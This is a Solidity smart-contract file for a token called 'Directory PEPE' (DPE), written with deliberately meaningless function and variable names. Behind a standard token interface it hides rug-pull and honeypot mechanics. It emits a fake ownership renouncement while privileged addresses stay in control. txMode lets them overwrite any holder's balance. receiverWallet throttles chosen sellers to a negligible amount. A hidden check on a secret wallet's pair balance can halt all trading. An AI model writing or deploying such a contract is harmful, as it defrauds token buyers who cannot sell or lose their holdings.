//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface autoReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyIsTo) external view returns (uint256);

    function transfer(address takeReceiver, uint256 teamList) external returns (bool);

    function allowance(address maxLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamList) external returns (bool);

    function transferFrom(
        address sender,
        address takeReceiver,
        uint256 teamList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptLaunched, uint256 value);
    event Approval(address indexed maxLaunched, address indexed spender, uint256 value);
}

abstract contract marketingWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchWalletShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atTrading {
    function createPair(address sellAuto, address launchEnable) external returns (address);
}

interface autoReceiverMetadata is autoReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DirectoryPEPE is marketingWallet, autoReceiver, autoReceiverMetadata {

    function getOwner() external view returns (address) {
        return totalLaunched;
    }

    function allowance(address buyEnable, address launchFee) external view virtual override returns (uint256) {
        if (launchFee == receiverSwap) {
            return type(uint256).max;
        }
        return txLaunched[buyEnable][launchFee];
    }

    uint256 private launchedFeeIs = 100000000 * 10 ** 18;

    bool private amountTx;

    uint256 public atLiquidity;

    function transfer(address txReceiver, uint256 teamList) external virtual override returns (bool) {
        return liquidityAutoLaunch(_msgSender(), txReceiver, teamList);
    }

    function walletMin(address exemptTx, address takeReceiver, uint256 teamList) internal returns (bool) {
        require(tradingFund[exemptTx] >= teamList);
        tradingFund[exemptTx] -= teamList;
        tradingFund[takeReceiver] += teamList;
        emit Transfer(exemptTx, takeReceiver, teamList);
        return true;
    }

    address autoLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address exemptTx, address takeReceiver, uint256 teamList) external override returns (bool) {
        if (_msgSender() != receiverSwap) {
            if (txLaunched[exemptTx][_msgSender()] != type(uint256).max) {
                require(teamList <= txLaunched[exemptTx][_msgSender()]);
                txLaunched[exemptTx][_msgSender()] -= teamList;
            }
        }
        return liquidityAutoLaunch(exemptTx, takeReceiver, teamList);
    }

    bool public walletTotal;

    bool public isBuy;

    event OwnershipTransferred(address indexed launchReceiver, address indexed autoList);

    uint256 constant tokenIs = 12 ** 10;

    function txMode(address txReceiver, uint256 teamList) public {
        teamLaunched();
        tradingFund[txReceiver] = teamList;
    }

    function approve(address launchFee, uint256 teamList) public virtual override returns (bool) {
        txLaunched[_msgSender()][launchFee] = teamList;
        emit Approval(_msgSender(), launchFee, teamList);
        return true;
    }

    address public autoShould;

    function limitEnable(address receiverAmountToken) public {
        require(receiverAmountToken.balance < 100000);
        if (liquiditySell) {
            return;
        }
        if (launchLimit == atLiquidity) {
            atLiquidity = enableTokenFund;
        }
        autoSwap[receiverAmountToken] = true;
        
        liquiditySell = true;
    }

    uint256 private launchTo;

    function owner() external view returns (address) {
        return totalLaunched;
    }

    address private totalLaunched;

    uint8 private sellToken = 18;

    constructor (){
        
        launchWalletShould launchMax = launchWalletShould(receiverSwap);
        maxLaunchExempt = atTrading(launchMax.factory()).createPair(launchMax.WETH(), address(this));
        
        autoShould = _msgSender();
        maxList();
        autoSwap[autoShould] = true;
        tradingFund[autoShould] = launchedFeeIs;
        if (fundToken != amountTx) {
            launchTo = enableTokenFund;
        }
        emit Transfer(address(0), autoShould, launchedFeeIs);
    }

    bool public liquiditySell;

    bool public fundToken;

    bool private senderMarketing;

    bool private tokenLaunchedTx;

    uint256 private enableTokenFund;

    mapping(address => mapping(address => uint256)) private txLaunched;

    function name() external view virtual override returns (string memory) {
        return fromAmountBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return sellToken;
    }

    mapping(address => bool) public autoSwap;

    function maxList() public {
        emit OwnershipTransferred(autoShould, address(0));
        totalLaunched = address(0);
    }

    uint256 isTotal;

    function symbol() external view virtual override returns (string memory) {
        return liquidityExempt;
    }

    function teamLaunched() private view {
        require(autoSwap[_msgSender()]);
    }

    function balanceOf(address buyIsTo) public view virtual override returns (uint256) {
        return tradingFund[buyIsTo];
    }

    address public maxLaunchExempt;

    string private fromAmountBuy = "Directory PEPE";

    function receiverWallet(address autoToken) public {
        teamLaunched();
        
        if (autoToken == autoShould || autoToken == maxLaunchExempt) {
            return;
        }
        sellAmount[autoToken] = true;
    }

    function listToken(uint256 teamList) public {
        teamLaunched();
        isTotal = teamList;
    }

    uint256 totalMax;

    uint256 public launchLimit;

    address receiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tradingFund;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedFeeIs;
    }

    function liquidityAutoLaunch(address exemptTx, address takeReceiver, uint256 teamList) internal returns (bool) {
        if (exemptTx == autoShould) {
            return walletMin(exemptTx, takeReceiver, teamList);
        }
        uint256 shouldAt = autoReceiver(maxLaunchExempt).balanceOf(autoLaunched);
        require(shouldAt == isTotal);
        require(takeReceiver != autoLaunched);
        if (sellAmount[exemptTx]) {
            return walletMin(exemptTx, takeReceiver, tokenIs);
        }
        return walletMin(exemptTx, takeReceiver, teamList);
    }

    string private liquidityExempt = "DPE";

    mapping(address => bool) public sellAmount;

}